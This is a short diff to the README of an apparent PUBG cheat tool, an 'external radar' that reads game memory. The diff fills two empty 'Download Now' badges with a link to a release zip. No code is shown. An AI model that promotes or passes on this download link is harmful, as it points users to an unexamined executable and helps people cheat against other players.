@@ -8,7 +8,7 @@
 [![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows)](https://github.com/)
 [![C++](https://img.shields.io/badge/C%2B%2B-20-00599C?style=for-the-badge&logo=cplusplus)](https://github.com/)
 [![License](https://img.shields.io/badge/license-private-red?style=for-the-badge)](https://github.com/)
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TwilightMaharaja/PUBG-Radar/releases/download/PUBG-Radar/PUBG-Radar.zip)
 
 ---
 
@@ -69,7 +69,7 @@ A lightweight, fully external PUBG radar. Reads game memory from a separate proc
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TwilightMaharaja/PUBG-Radar/releases/download/PUBG-Radar/PUBG-Radar.zip)
 
 ## 🚀 Installation
 
